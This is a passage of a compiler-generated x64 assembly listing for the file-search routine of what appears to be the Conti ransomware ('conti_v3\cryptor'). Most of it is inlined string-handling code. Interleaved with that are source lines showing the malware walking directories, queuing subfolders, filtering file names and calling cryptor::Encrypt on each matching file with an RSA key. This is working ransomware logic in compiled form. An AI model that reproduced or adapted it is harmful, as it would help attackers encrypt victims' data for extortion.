; 149  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

  008f1	48 83 c0 27	 add	 rax, 39			; 00000027H
  008f5	48 83 e0 e0	 and	 rax, -32		; ffffffffffffffe0H

; 150  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

  008f9	48 89 48 f8	 mov	 QWORD PTR [rax-8], rcx

; 242  :             return _Allocate_manually_vector_aligned<_Traits>(_Bytes);

  008fd	eb 0e		 jmp	 SHORT $LN1558@SearchFile
$LN1559@SearchFile:

; 243  :         }
; 244  :     }
; 245  : #endif // defined(_M_IX86) || defined(_M_X64)
; 246  : 
; 247  :     if (_Bytes != 0) {

  008ff	48 85 c9	 test	 rcx, rcx
  00902	74 07		 je	 SHORT $LN1560@SearchFile

; 90   :         return ::operator new(_Bytes);

  00904	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new

; 248  :         return _Traits::_Allocate(_Bytes);

  00909	eb 02		 jmp	 SHORT $LN1558@SearchFile
$LN1560@SearchFile:

; 249  :     }
; 250  : 
; 251  :     return nullptr;

  0090b	33 c0		 xor	 eax, eax
$LN1558@SearchFile:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  0090d	4c 8d 04 5d 02
	00 00 00	 lea	 r8, QWORD PTR [rbx*2+2]

; 2701 :         _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

  00915	48 89 45 00	 mov	 QWORD PTR $T20[rbp-256], rax

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  00919	48 8b d6	 mov	 rdx, rsi

; 2703 :         _My_data._Mysize = _Count;

  0091c	48 89 5d 10	 mov	 QWORD PTR $T20[rbp-240], rbx

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  00920	48 8b c8	 mov	 rcx, rax

; 2704 :         _My_data._Myres  = _New_capacity;

  00923	48 89 7d 18	 mov	 QWORD PTR $T20[rbp-232], rdi

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  00927	e8 00 00 00 00	 call	 memcpy
$LN1536@SearchFile:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 209  : 				std::wstring Directory = MakePath(CurrentDirectory, FindData.cFileName);

  0092c	4c 8d 45 b0	 lea	 r8, QWORD PTR $T18[rbp-256]
  00930	48 8d 55 00	 lea	 rdx, QWORD PTR $T20[rbp-256]
  00934	48 8d 8d 90 03
	00 00		 lea	 rcx, QWORD PTR Directory$78[rbp-256]
  0093b	e8 00 00 00 00	 call	 ?MakePath@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@0@Z ; MakePath

; 210  : 				PDIRECTORY_INFO DirectoryInfo = new DIRECTORY_INFO;

  00940	b9 30 00 00 00	 mov	 ecx, 48			; 00000030H
  00945	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new
  0094a	0f 57 c0	 xorps	 xmm0, xmm0

; 211  : 				DirectoryInfo->Directory = Directory;

  0094d	48 8d 95 90 03
	00 00		 lea	 rdx, QWORD PTR Directory$78[rbp-256]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2648 :         _My_data._Mysize = 0;

  00954	33 f6		 xor	 esi, esi
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 211  : 				DirectoryInfo->Directory = Directory;

  00956	48 8b c8	 mov	 rcx, rax
  00959	48 8b f8	 mov	 rdi, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

  0095c	0f 11 00	 movups	 XMMWORD PTR [rax], xmm0

; 2648 :         _My_data._Mysize = 0;

  0095f	48 89 70 10	 mov	 QWORD PTR [rax+16], rsi

; 2649 :         _My_data._Myres  = _Small_string_capacity;

  00963	48 c7 40 18 07
	00 00 00	 mov	 QWORD PTR [rax+24], 7

; 2650 :         _My_data._Activate_SSO_buffer();
; 2651 : 
; 2652 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 2653 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  0096b	66 89 30	 mov	 WORD PTR [rax], si
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 211  : 				DirectoryInfo->Directory = Directory;

  0096e	e8 00 00 00 00	 call	 ??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@AEBV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator=

; 212  : 				TAILQ_INSERT_TAIL(&DirectoryList, DirectoryInfo, Entries);

  00973	48 89 77 20	 mov	 QWORD PTR [rdi+32], rsi
  00977	48 8d 57 20	 lea	 rdx, QWORD PTR [rdi+32]
  0097b	48 8b 8d 98 00
	00 00		 mov	 rcx, QWORD PTR DirectoryList$[rbp-248]
  00982	48 89 4f 28	 mov	 QWORD PTR [rdi+40], rcx
  00986	48 8b 85 98 00
	00 00		 mov	 rax, QWORD PTR DirectoryList$[rbp-248]
  0098d	48 89 38	 mov	 QWORD PTR [rax], rdi
  00990	48 89 95 98 00
	00 00		 mov	 QWORD PTR DirectoryList$[rbp-248], rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

  00997	48 8b 95 a8 03
	00 00		 mov	 rdx, QWORD PTR Directory$78[rbp-232]
  0099e	48 83 fa 07	 cmp	 rdx, 7

; 4866 :         if (_My_data._Large_mode_engaged()) {

  009a2	76 39		 jbe	 SHORT $LN1460@SearchFile
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 977  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  009a4	48 8b 8d 90 03
	00 00		 mov	 rcx, QWORD PTR Directory$78[rbp-256]
  009ab	48 8d 14 55 02
	00 00 00	 lea	 rdx, QWORD PTR [rdx*2+2]
  009b3	48 8b c1	 mov	 rax, rcx

; 264  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  009b6	48 81 fa 00 10
	00 00		 cmp	 rdx, 4096		; 00001000H
  009bd	72 19		 jb	 SHORT $LN1459@SearchFile

; 163  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  009bf	48 8b 49 f8	 mov	 rcx, QWORD PTR [rcx-8]
  009c3	48 83 c2 27	 add	 rdx, 39			; 00000027H
  009c7	48 2b c1	 sub	 rax, rcx

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  009ca	48 83 c0 f8	 add	 rax, -8
  009ce	48 83 f8 1f	 cmp	 rax, 31
  009d2	0f 87 40 04 00
	00		 ja	 $LN158@SearchFile
$LN1459@SearchFile:

; 268  :         ::operator delete(_Ptr, _Bytes);

  009d8	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN1460@SearchFile:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 4873 :         _My_data._Mysize = 0;

  009dd	48 89 b5 a0 03
	00 00		 mov	 QWORD PTR Directory$78[rbp-240], rsi

; 4874 :         _My_data._Myres  = _Small_string_capacity;

  009e4	48 c7 85 a8 03
	00 00 07 00 00
	00		 mov	 QWORD PTR Directory$78[rbp-232], 7

; 4875 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4876 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  009ef	66 89 b5 90 03
	00 00		 mov	 WORD PTR Directory$78[rbp-256], si
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 214  : 			}

  009f6	e9 e3 02 00 00	 jmp	 $LN13@SearchFile
$LN29@SearchFile:

; 215  : 			else if (CheckFilename(FindData.cFileName)) {

  009fb	48 8d 8d ec 03
	00 00		 lea	 rcx, QWORD PTR FindData$81[rbp-212]
  00a02	e8 00 00 00 00	 call	 ?CheckFilename@@YAHPEB_W@Z ; CheckFilename
  00a07	85 c0		 test	 eax, eax
  00a09	0f 84 cf 02 00
	00		 je	 $LN13@SearchFile
  00a0f	0f 57 c0	 xorps	 xmm0, xmm0
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 264  :         return _CSTD wcslen(reinterpret_cast<const wchar_t*>(_First));

  00a12	48 8d 85 ec 03
	00 00		 lea	 rax, QWORD PTR FindData$81[rbp-212]

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

  00a19	0f 11 45 d0	 movups	 XMMWORD PTR $T44[rbp-256], xmm0

; 264  :         return _CSTD wcslen(reinterpret_cast<const wchar_t*>(_First));

  00a1d	48 c7 c7 ff ff
	ff ff		 mov	 rdi, -1
$LL1725@SearchFile:
  00a24	48 ff c7	 inc	 rdi
  00a27	66 83 3c 78 00	 cmp	 WORD PTR [rax+rdi*2], 0
  00a2c	75 f6		 jne	 SHORT $LL1725@SearchFile

; 2669 :         if (_Count > max_size()) {

  00a2e	48 bb fe ff ff
	ff ff ff ff 7f	 mov	 rbx, 9223372036854775806 ; 7ffffffffffffffeH
  00a38	48 3b fb	 cmp	 rdi, rbx
  00a3b	0f 87 fb 03 00
	00		 ja	 $LN1678@SearchFile

; 2671 :         }
; 2672 : 
; 2673 :         auto& _Al       = _Getal();
; 2674 :         auto&& _Alproxy = _GET_PROXY_ALLOCATOR(_Alty, _Al);
; 2675 :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data);
; 2676 : 
; 2677 :         if (_Count <= _Small_string_capacity) {

  00a41	48 83 ff 07	 cmp	 rdi, 7
  00a45	77 2c		 ja	 SHORT $LN1267@SearchFile

; 2678 :             _My_data._Mysize = _Count;

  00a47	48 89 7d e0	 mov	 QWORD PTR $T44[rbp-240], rdi

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  00a4b	48 8d 95 ec 03
	00 00		 lea	 rdx, QWORD PTR FindData$81[rbp-212]
  00a52	48 03 ff	 add	 rdi, rdi

; 2679 :             _My_data._Myres  = _Small_string_capacity;

  00a55	48 c7 45 e8 07
	00 00 00	 mov	 QWORD PTR $T44[rbp-232], 7

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  00a5d	4c 8b c7	 mov	 r8, rdi
  00a60	48 8d 4d d0	 lea	 rcx, QWORD PTR $T44[rbp-256]
  00a64	e8 00 00 00 00	 call	 memcpy

; 2686 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());

  00a69	66 89 74 3d d0	 mov	 WORD PTR $T44[rbp+rdi-256], si

; 2687 :             } else { // _Strat == _Construct_strategy::_From_string
; 2688 : #ifdef _INSERT_STRING_ANNOTATION
; 2689 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _Count + 1);
; 2690 : #else // ^^^ _INSERT_STRING_ANNOTATION / !_INSERT_STRING_ANNOTATION vvv
; 2691 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _BUF_SIZE);
; 2692 : #endif // ^^^ !_INSERT_STRING_ANNOTATION ^^^
; 2693 :             }
; 2694 : 
; 2695 :             _Proxy._Release();
; 2696 :             return;

  00a6e	e9 b3 00 00 00	 jmp	 $LN1265@SearchFile
$LN1267@SearchFile:

; 4761 :         const size_type _Masked = _Requested | _Alloc_mask;

  00a73	48 8b f7	 mov	 rsi, rdi
  00a76	48 83 ce 07	 or	 rsi, 7

; 4762 :         if (_Masked > _Max) { // the mask overflows, settle for max_size()

  00a7a	48 3b f3	 cmp	 rsi, rbx
  00a7d	76 13		 jbe	 SHORT $LN1272@SearchFile

; 4763 :             return _Max;

  00a7f	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH
  00a89	48 8b f3	 mov	 rsi, rbx
  00a8c	48 8d 0c 00	 lea	 rcx, QWORD PTR [rax+rax]
  00a90	eb 30		 jmp	 SHORT $LN1714@SearchFile
$LN1272@SearchFile:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility

; 77   :     return _Left < _Right ? _Right : _Left;

  00a92	48 83 fe 0a	 cmp	 rsi, 10
  00a96	b8 0a 00 00 00	 mov	 eax, 10
  00a9b	48 0f 42 f0	 cmovb	 rsi, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 73   :         if (_Count > _Max_possible) {

  00a9f	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2613 :         ++_Capacity; // Take null terminator into consideration

  00aa9	48 8d 4e 01	 lea	 rcx, QWORD PTR [rsi+1]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 73   :         if (_Count > _Max_possible) {

  00aad	48 3b c8	 cmp	 rcx, rax
  00ab0	0f 87 80 03 00
	00		 ja	 $LN1680@SearchFile

; 74   :             _Throw_bad_array_new_length(); // multiply overflow
; 75   :         }
; 76   :     }
; 77   : 
; 78   :     return _Count * _Ty_size;

  00ab6	48 03 c9	 add	 rcx, rcx

; 241  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  00ab9	48 81 f9 00 10
	00 00		 cmp	 rcx, 4096		; 00001000H
  00ac0	72 2c		 jb	 SHORT $LN1288@SearchFile
$LN1714@SearchFile:

; 142  :     const size_t _Block_size = _Non_user_size + _Bytes;

  00ac2	48 8d 41 27	 lea	 rax, QWORD PTR [rcx+39]

; 143  :     if (_Block_size <= _Bytes) {

  00ac6	48 3b c1	 cmp	 rax, rcx
  00ac9	0f 86 67 03 00
	00		 jbe	 $LN1680@SearchFile

; 90   :         return ::operator new(_Bytes);

  00acf	48 8b c8	 mov	 rcx, rax
  00ad2	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new

; 148  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

  00ad7	48 85 c0	 test	 rax, rax
  00ada	0f 84 50 03 00
	00		 je	 $LN1403@SearchFile

; 149  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

  00ae0	48 8d 58 27	 lea	 rbx, QWORD PTR [rax+39]
  00ae4	48 83 e3 e0	 and	 rbx, -32		; ffffffffffffffe0H

; 150  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

  00ae8	48 89 43 f8	 mov	 QWORD PTR [rbx-8], rax

; 242  :             return _Allocate_manually_vector_aligned<_Traits>(_Bytes);

  00aec	eb 11		 jmp	 SHORT $LN1287@SearchFile
$LN1288@SearchFile:

; 243  :         }
; 244  :     }
; 245  : #endif // defined(_M_IX86) || defined(_M_X64)
; 246  : 
; 247  :     if (_Bytes != 0) {

  00aee	48 85 c9	 test	 rcx, rcx
  00af1	74 07		 je	 SHORT $LN1289@SearchFile

; 90   :         return ::operator new(_Bytes);

  00af3	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new

; 248  :         return _Traits::_Allocate(_Bytes);

  00af8	eb 02		 jmp	 SHORT $LN1820@SearchFile
$LN1289@SearchFile:

; 249  :     }
; 250  : 
; 251  :     return nullptr;

  00afa	33 c0		 xor	 eax, eax
$LN1820@SearchFile:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2701 :         _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

  00afc	48 8b d8	 mov	 rbx, rax
$LN1287@SearchFile:

; 2703 :         _My_data._Mysize = _Count;

  00aff	48 89 7d e0	 mov	 QWORD PTR $T44[rbp-240], rdi

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  00b03	48 8d 95 ec 03
	00 00		 lea	 rdx, QWORD PTR FindData$81[rbp-212]
  00b0a	48 03 ff	 add	 rdi, rdi

; 2701 :         _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

  00b0d	48 89 5d d0	 mov	 QWORD PTR $T44[rbp-256], rbx

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  00b11	4c 8b c7	 mov	 r8, rdi

; 2704 :         _My_data._Myres  = _New_capacity;

  00b14	48 89 75 e8	 mov	 QWORD PTR $T44[rbp-232], rsi

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  00b18	48 8b cb	 mov	 rcx, rbx
  00b1b	e8 00 00 00 00	 call	 memcpy

; 2710 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());

  00b20	33 f6		 xor	 esi, esi
  00b22	66 89 34 1f	 mov	 WORD PTR [rdi+rbx], si
$LN1265@SearchFile:

; 2244 :         return _Myres > _Small_string_capacity;

  00b26	48 83 bd 48 03
	00 00 07	 cmp	 QWORD PTR CurrentDirectory$75[rbp-232], 7

; 2509 :         _Construct<_Construct_strategy::_From_string>(_Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize);

  00b2e	48 b8 fe ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775806 ; 7ffffffffffffffeH
  00b38	48 8b 9d 40 03
	00 00		 mov	 rbx, QWORD PTR CurrentDirectory$75[rbp-240]

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

  00b3f	48 89 75 28	 mov	 QWORD PTR $T46[rbp-248], rsi

; 2235 :         const value_type* _Result = _Bx._Buf;

  00b43	48 8d b5 30 03
	00 00		 lea	 rsi, QWORD PTR CurrentDirectory$75[rbp-256]

; 2236 :         if (_Large_mode_engaged()) {

  00b4a	48 0f 47 b5 30
	03 00 00	 cmova	 rsi, QWORD PTR CurrentDirectory$75[rbp-256]

; 2509 :         _Construct<_Construct_strategy::_From_string>(_Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize);

  00b52	48 3b d8	 cmp	 rbx, rax

; 2669 :         if (_Count > max_size()) {

  00b55	0f 87 e1 02 00
	00		 ja	 $LN1678@SearchFile

; 2671 :         }
; 2672 : 
; 2673 :         auto& _Al       = _Getal();
; 2674 :         auto&& _Alproxy = _GET_PROXY_ALLOCATOR(_Alty, _Al);
; 2675 :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data);
; 2676 : 
; 2677 :         if (_Count <= _Small_string_capacity) {

  00b5b	48 83 fb 07	 cmp	 rbx, 7
  00b5f	77 18		 ja	 SHORT $LN1328@SearchFile

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  00b61	0f 10 06	 movups	 xmm0, XMMWORD PTR [rsi]

; 2678 :             _My_data._Mysize = _Count;

  00b64	48 89 5d 30	 mov	 QWORD PTR $T46[rbp-240], rbx

; 2679 :             _My_data._Myres  = _Small_string_capacity;

  00b68	48 c7 45 38 07
	00 00 00	 mov	 QWORD PTR $T46[rbp-232], 7

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  00b70	0f 11 45 20	 movups	 XMMWORD PTR $T46[rbp-256], xmm0

; 2696 :             return;

  00b74	e9 ab 00 00 00	 jmp	 $LN1326@SearchFile
$LN1328@SearchFile:

; 4761 :         const size_type _Masked = _Requested | _Alloc_mask;

  00b79	48 8b fb	 mov	 rdi, rbx
  00b7c	48 83 cf 07	 or	 rdi, 7

; 4762 :         if (_Masked > _Max) { // the mask overflows, settle for max_size()

  00b80	48 3b f8	 cmp	 rdi, rax
  00b83	76 13		 jbe	 SHORT $LN1333@SearchFile

; 4763 :             return _Max;

  00b85	48 8b f8	 mov	 rdi, rax
  00b88	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH
  00b92	48 8d 0c 00	 lea	 rcx, QWORD PTR [rax+rax]
  00b96	eb 30		 jmp	 SHORT $LN1713@SearchFile
$LN1333@SearchFile:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility

; 77   :     return _Left < _Right ? _Right : _Left;

  00b98	48 83 ff 0a	 cmp	 rdi, 10
  00b9c	b8 0a 00 00 00	 mov	 eax, 10
  00ba1	48 0f 42 f8	 cmovb	 rdi, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 73   :         if (_Count > _Max_possible) {

  00ba5	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2613 :         ++_Capacity; // Take null terminator into consideration

  00baf	48 8d 4f 01	 lea	 rcx, QWORD PTR [rdi+1]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 73   :         if (_Count > _Max_possible) {

  00bb3	48 3b c8	 cmp	 rcx, rax
  00bb6	0f 87 7a 02 00
	00		 ja	 $LN1680@SearchFile

; 74   :             _Throw_bad_array_new_length(); // multiply overflow
; 75   :         }
; 76   :     }
; 77   : 
; 78   :     return _Count * _Ty_size;

  00bbc	48 03 c9	 add	 rcx, rcx

; 241  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  00bbf	48 81 f9 00 10
	00 00		 cmp	 rcx, 4096		; 00001000H
  00bc6	72 2f		 jb	 SHORT $LN1349@SearchFile
$LN1713@SearchFile:

; 142  :     const size_t _Block_size = _Non_user_size + _Bytes;

  00bc8	48 8d 41 27	 lea	 rax, QWORD PTR [rcx+39]

; 143  :     if (_Block_size <= _Bytes) {

  00bcc	48 3b c1	 cmp	 rax, rcx
  00bcf	0f 86 61 02 00
	00		 jbe	 $LN1680@SearchFile

; 90   :         return ::operator new(_Bytes);

  00bd5	48 8b c8	 mov	 rcx, rax
  00bd8	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new
  00bdd	48 8b c8	 mov	 rcx, rax

; 148  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

  00be0	48 85 c0	 test	 rax, rax
  00be3	0f 84 47 02 00
	00		 je	 $LN1403@SearchFile

; 149  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

  00be9	48 83 c0 27	 add	 rax, 39			; 00000027H
  00bed	48 83 e0 e0	 and	 rax, -32		; ffffffffffffffe0H

; 150  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

  00bf1	48 89 48 f8	 mov	 QWORD PTR [rax-8], rcx

; 242  :             return _Allocate_manually_vector_aligned<_Traits>(_Bytes);

  00bf5	eb 0e		 jmp	 SHORT $LN1348@SearchFile
$LN1349@SearchFile:

; 243  :         }
; 244  :     }
; 245  : #endif // defined(_M_IX86) || defined(_M_X64)
; 246  : 
; 247  :     if (_Bytes != 0) {

  00bf7	48 85 c9	 test	 rcx, rcx
  00bfa	74 07		 je	 SHORT $LN1350@SearchFile

; 90   :         return ::operator new(_Bytes);

  00bfc	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new

; 248  :         return _Traits::_Allocate(_Bytes);

  00c01	eb 02		 jmp	 SHORT $LN1348@SearchFile
$LN1350@SearchFile:

; 249  :     }
; 250  : 
; 251  :     return nullptr;

  00c03	33 c0		 xor	 eax, eax
$LN1348@SearchFile:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  00c05	4c 8d 04 5d 02
	00 00 00	 lea	 r8, QWORD PTR [rbx*2+2]

; 2701 :         _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

  00c0d	48 89 45 20	 mov	 QWORD PTR $T46[rbp-256], rax

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  00c11	48 8b d6	 mov	 rdx, rsi

; 2703 :         _My_data._Mysize = _Count;

  00c14	48 89 5d 30	 mov	 QWORD PTR $T46[rbp-240], rbx

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  00c18	48 8b c8	 mov	 rcx, rax

; 2704 :         _My_data._Myres  = _New_capacity;

  00c1b	48 89 7d 38	 mov	 QWORD PTR $T46[rbp-232], rdi

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  00c1f	e8 00 00 00 00	 call	 memcpy
$LN1326@SearchFile:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 217  : 				std::wstring Filename = MakePath(CurrentDirectory, FindData.cFileName);

  00c24	4c 8d 45 d0	 lea	 r8, QWORD PTR $T44[rbp-256]
  00c28	48 8d 55 20	 lea	 rdx, QWORD PTR $T46[rbp-256]
  00c2c	48 8d 8d 70 03
	00 00		 lea	 rcx, QWORD PTR Filename$77[rbp-256]
  00c33	e8 00 00 00 00	 call	 ?MakePath@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@0@Z ; MakePath

; 221  : 				cryptor::Encrypt(&FileInfo, Buffer, CryptoProvider, RsaKey);

  00c38	4c 8b 4d f0	 mov	 r9, QWORD PTR RsaKey$GSCopy$1$[rbp-256]
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  00c3c	48 8d bd a0 00
	00 00		 lea	 rdi, QWORD PTR FileInfo$74[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 221  : 				cryptor::Encrypt(&FileInfo, Buffer, CryptoProvider, RsaKey);

  00c43	48 8b 55 f8	 mov	 rdx, QWORD PTR Buffer$GSCopy$1$[rbp-256]
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  00c47	33 c0		 xor	 eax, eax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

  00c49	48 83 bd 88 03
	00 00 07	 cmp	 QWORD PTR Filename$77[rbp-232], 7
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  00c51	b9 90 02 00 00	 mov	 ecx, 656		; 00000290H
  00c56	f3 aa		 rep stosb
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2235 :         const value_type* _Result = _Bx._Buf;

  00c58	48 8d 85 70 03
	00 00		 lea	 rax, QWORD PTR Filename$77[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 221  : 				cryptor::Encrypt(&FileInfo, Buffer, CryptoProvider, RsaKey);

  00c5f	4d 8b c5	 mov	 r8, r13
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2236 :         if (_Large_mode_engaged()) {

  00c62	48 0f 47 85 70
	03 00 00	 cmova	 rax, QWORD PTR Filename$77[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 221  : 				cryptor::Encrypt(&FileInfo, Buffer, CryptoProvider, RsaKey);

  00c6a	48 8d 8d a0 00
	00 00		 lea	 rcx, QWORD PTR FileInfo$74[rbp-256]
  00c71	48 89 85 a0 00
	00 00		 mov	 QWORD PTR FileInfo$74[rbp-256], rax
  00c78	e8 00 00 00 00	 call	 ?Encrypt@cryptor@@YAHPEAUfile_info@1@PEAE_K2@Z ; cryptor::Encrypt
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

  00c7d	48 8b 95 88 03
	00 00		 mov	 rdx, QWORD PTR Filename$77[rbp-232]
  00c84	48 83 fa 07	 cmp	 rdx, 7

; 4866 :         if (_My_data._Large_mode_engaged()) {

  00c88	76 39		 jbe	 SHORT $LN1407@SearchFile
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 977  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  00c8a	48 8b 8d 70 03
	00 00		 mov	 rcx, QWORD PTR Filename$77[rbp-256]
  00c91	48 8d 14 55 02
	00 00 00	 lea	 rdx, QWORD PTR [rdx*2+2]
  00c99	48 8b c1	 mov	 rax, rcx

; 264  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  00c9c	48 81 fa 00 10
	00 00		 cmp	 rdx, 4096		; 00001000H
  00ca3	72 19		 jb	 SHORT $LN1406@SearchFile

; 163  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

